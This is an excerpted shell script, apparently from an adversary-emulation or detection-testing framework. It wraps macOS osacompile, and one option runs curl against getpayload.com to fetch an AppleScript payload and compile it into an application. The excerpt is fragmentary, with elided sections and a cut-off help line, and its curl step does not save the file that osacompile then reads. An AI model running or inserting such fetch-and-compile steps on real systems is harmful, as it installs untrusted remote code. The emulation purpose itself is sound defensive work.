...
DOWNLOAD_AND_COMPILE_A_PAYLOAD=false

CMD_OSACOMPILE="/usr/bin/osacompile"
...
PROCEDURE_NAME="osacompile"  # Set by build system from YAML procedure_name field
...
# We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
        --download-and-compile-a-payload)
            DOWNLOAD_AND_COMPILE_A_PAYLOAD=true
            ;;
            *)
...
SCRIPT:
  --download-and-compile-a-payload The following command downloads an applescript payload from getpayload.com and compiles it into an a
...
# Execute functions for --download-and-compile-a-payload
if [ "$DOWNLOAD_AND_COMPILE_A_PAYLOAD" = true ]; then
    core_debug_print "Executing functions for --download-and-compile-a-payload"
    result=$(execute_function execute_download_compile_payload)
    raw_output="${raw_output}${result}"
fi

# Set procedure name for processing
procedure="osacompile"
...
# Function: execute_download_compile_payload
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_download_compile_payload() {
    local result
    result=$(curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script -o payload.app 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}
